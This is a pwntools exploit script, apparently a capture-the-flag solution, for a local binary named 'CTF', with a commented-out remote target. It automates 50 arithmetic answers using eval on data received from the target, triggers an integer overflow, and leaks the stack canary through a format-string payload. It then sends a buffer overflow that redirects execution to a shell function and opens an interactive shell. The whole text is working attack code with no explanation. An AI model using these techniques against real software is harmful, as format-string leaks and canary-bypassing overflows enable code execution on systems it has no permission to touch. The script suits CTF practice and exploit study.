from pwn import *
context(log_level='debug')
p = process('./CTF')
#p = remote('43.248.98.206',10074)
p.recvuntil('and tell you a secret ')

secret = p.recvuntil('\n',drop=True)
secret = int(secret,16)
log.info(f'getshell_address====>{hex(secret)}')

def challenge1():
    for item in range(50):
        p.recvuntil('num1:')
        num1 = p.recvuntil(',',drop=True)
        p.recvuntil('num2:')
        num2 = p.recvuntil('\n',drop=True)
        p.recvuntil('operator:')
        operator = p.recvuntil('\n',drop=True)
        result = int(eval(num1+operator+num2))
        p.recvuntil('Your answer is: ')
        p.sendline(str(result))

def challenge2():
    sleep(1)
    p.recvuntil('Your answer: ')
    p.sendline(str(-9223372036854775796))
    p.recvuntil('Your answer: \n')
    p.sendline(str(1))
        
def challenge3():
    p.recvuntil('Your answer: ')
    p.sendline("%25$p")
    p.recvuntil('\n')
    can = p.recvuntil('\n',drop=True)
    can = int(can,16)
    log.success(f'Canary===>{hex(can)}')
    p.recvuntil('Your answer: ')
    p.send(b'a'*0x88+p64(can)+p64(0)+p64(secret))
        
challenge1()
challenge2()
challenge3()
p.interactive()